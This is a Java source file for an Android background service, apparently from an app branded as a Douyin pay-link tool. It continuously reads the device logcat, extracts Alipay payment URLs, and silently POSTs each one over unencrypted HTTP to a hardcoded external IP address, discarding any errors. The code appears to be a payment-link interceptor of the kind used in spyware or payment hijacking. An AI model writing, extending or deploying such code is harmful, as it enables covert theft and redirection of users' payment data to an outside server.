package com.douyin.paylink;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class LogcatMonitor extends Service {
    
    private Thread monitorThread;
    private boolean running = false;
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        running = true;
        monitorThread = new Thread(() -> {
            try {
                Process process = Runtime.getRuntime().exec("logcat -v raw");
                BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
                
                String line;
                while (running && (line = reader.readLine()) != null) {
                    if (line.contains("alipay://") || line.contains("alipays://")) {
                        extractAndSend(line);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
        monitorThread.start();
        return START_STICKY;
    }
    
    private void extractAndSend(String logLine) {
        // 提取支付链接
        int start = logLine.indexOf("alipay");
        if (start == -1) return;
        
        String link = logLine.substring(start);
        int end = link.indexOf(" ");
        if (end > 0) link = link.substring(0, end);
        
        sendToServer(link);
    }
    
    private void sendToServer(String link) {
        // 显示到界面
        MainActivity.addLog(link);
        
        // 发送到服务器
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL("http://43.162.112.203:5000/payment");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                String json = "{\"url\":\"" + link + "\"}";
                java.io.OutputStream os = conn.getOutputStream();
                os.write(json.getBytes());
                os.flush();
                os.close();
                conn.getResponseCode();
            } catch (Exception e) {}
        }).start();
    }
    
    @Override
    public void onDestroy() {
        running = false;
        super.onDestroy();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
